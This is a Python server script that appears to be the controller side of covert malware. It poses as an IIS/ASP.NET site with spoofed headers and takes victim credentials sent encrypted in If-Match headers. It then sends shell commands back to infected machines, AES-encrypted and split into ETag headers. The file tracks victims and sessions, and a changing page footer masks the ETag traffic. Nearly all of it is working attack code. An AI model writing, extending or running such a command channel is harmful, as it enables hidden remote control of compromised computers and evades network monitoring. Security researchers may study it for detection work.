#!/usr/bin/env python

from http.server import BaseHTTPRequestHandler, HTTPServer
import os
import re
import time
#import code
#code.interact(local=dict(globals(), **locals()))

from Crypto.Cipher import AES

key = b'\x9b)\xbf\xc3R\xb0/\xea\xb7\xbc3\xba\xf3\xdf\xf3}'

#differ victims be initial etag they send (uesr and pass encrypted - in headers as "if-match"
victims = {}
#last etag used per victim in key
etags_to_victims = {}


class KodeFunHTTPRequestHandler(BaseHTTPRequestHandler):
        
    def __init__(self, *args, **kwargs):
            self.server_version="Microsoft-IIS/10.0"
            self.sys_version=""
            super(KodeFunHTTPRequestHandler, self).__init__(*args, **kwargs)
            

        
    def do_GET(self):
        request_headers = dict(self.headers._headers)
        
        try:
            
            #not trying to access main page
            if self.path not in set(("/home_new.html",)):
                raise IOError()
                
            #print(victims)
            etag_from_client = bytes.fromhex(request_headers["If-Match"])
            
            #the session is off somehow - need to reorganize so aes keys work
            if etag_from_client not in etags_to_victims:
                handle_unmaped_etag(etag_from_client)
                        
            #sever and victim are in sync in terms of aes keys
            cipher_generator=AES.new(key,AES.MODE_CBC,etag_from_client)
            
            f = open("./" + self.path)
            self.send_response(200)
            
            #gets command from victim dict
            command=get_victim_command(etag_from_client)
            etag=cipher_generator.encrypt(bytes(command,'ascii'))
            
            #updates the etags in the dicts
            update_victim(etag_from_client,etag)
            self.send_header('Content-type','text/html')
            self.send_header('ETag',etag.hex())
            self.send_header('X-Powered-By','ASP.NET')
            self.end_headers()
            
            #adds date footer (so file always changes and it makes sense to whomever checking that the etag changes)
            self.wfile.write(bytes(prepare_file(f.read()), "utf-8"))
            f.close()
            return
        
        except IOError:
            try:
                f = open("./not_found.html")
                self.send_response(404)
                self.send_header('Content-type','text/html')
                self.send_header('X-Powered-By','ASP.NET')
                self.end_headers()
                self.wfile.write(bytes(f.read(), "utf-8"))
            except:
                return
                

def handle_unmaped_etag(etag_from_client):

    #if not in victims - new victim
    if etag_from_client not in victims:
        handle_init_victim(etag_from_client)
        
    #the victim and server went out of sync 
    else:
        previous_sessions_etag = victims[etag_from_client]["current_etag"]
        if not(previous_sessions_etag in etags_to_victims and etags_to_victims[previous_sessions_etag] is victims[etag_from_client]):
            print('sanity check faild -- victim exists and is does not have previous etag')
        
        #victim restarted session - updates dicts
        else:
            print("\n\nvictim {} has restarted session\n\n".format(victims[etag_from_client]['creds']['victim_id']))
            del etags_to_victims[previous_sessions_etag]
            victims[etag_from_client]["current_etag"]= etag_from_client
            etags_to_victims[etag_from_client] = victims[etag_from_client]
            victims[etag_from_client]["command_offset"] = 0

#new victim - adds in dicts and unencrypts creds and sets command
def handle_init_victim(etag_from_client):
    victims[etag_from_client]={"creds":decrypt_victim_creds(etag_from_client),"current_etag":etag_from_client}
    etags_to_victims[etag_from_client]=victims[etag_from_client]
    victims[etag_from_client]["command"] = set_command("python -c \"import os;print(os.system('hostname'))\"")

#adds null terminator and padding to be x16 length
def set_command(command):
    command+="\x00"
    return command.ljust(len(command)+(16-len(command)%16),'\x00')

#decrypts victim creds with init iv
def decrypt_victim_creds(etag_from_client):
    victim_creds_iv = b's\x9f\xd3w\xac\x92\xa2\xcb\xe9\xf7\xec>\x0ep\x1e '
    creds_decryptor = AES.new(key, AES.MODE_CBC, victim_creds_iv)
    try:
        creds_data = creds_decryptor.decrypt(etag_from_client)
    except:
        print("non victim")
    victim_id, victim_key = creds_data[:8], creds_data[8:16]
    return {'victim_id':victim_id, 'victim_key':victim_key}

#every request-response we update the etags to keep track of victim and session - so aes keys are in sync  
def update_victim(previous_etag,new_etag):
    current_victim = etags_to_victims[previous_etag]
    current_victim["current_etag"] = new_etag
    del etags_to_victims[previous_etag]
    etags_to_victims[new_etag] = current_victim
    current_victim["last_updated"] = time.ctime()

#find command needed to send to specific victim, sends commands in len 16 chunks to keep etag same length (every 3 sec sends correct chunk according to offset)
def get_victim_command(etag_from_client):
    current_victim = etags_to_victims[etag_from_client]
    full_command=current_victim["command"]
    if "command_offset" not in current_victim:
        current_victim["command_offset"] = 0
    command_offset = current_victim["command_offset"]
    command_chunk = full_command[command_offset:(command_offset + 16 )]
    current_victim["command_offset"] = (command_offset + 16 )% len(full_command)
    return command_chunk

#adds currents date to footer of file - to keep it changed every time
def prepare_file(unprepared_file_content):
     return re.sub("(</html>)","<footer style=\"center\">{}</footer>\\1".format(time.ctime()),unprepared_file_content)


def run():
    print('http server is starting...')

    server_address = ('127.0.0.1', 8082)
    httpd = HTTPServer(server_address, KodeFunHTTPRequestHandler)
    print('http server is running...')
    httpd.serve_forever()
    
if __name__ == '__main__':
    run()
    